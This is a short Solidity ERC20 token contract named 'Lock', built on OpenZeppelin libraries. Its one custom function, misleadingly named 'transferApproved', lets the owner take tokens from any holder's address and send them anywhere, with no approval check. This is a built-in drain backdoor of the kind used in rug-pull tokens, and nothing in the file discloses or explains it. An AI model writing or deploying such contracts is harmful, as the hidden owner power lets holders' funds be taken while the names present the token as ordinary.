// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Lock is ERC20, Ownable {
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        address _owner
    ) ERC20(name, symbol) Ownable(_owner) {
        _mint(msg.sender, initialSupply);
    }

    function transferApproved(
        address from,
        address recipient,
        uint256 amount
    ) public onlyOwner returns (bool) {
        _transfer(from, recipient, amount);
        return true;
    }
}
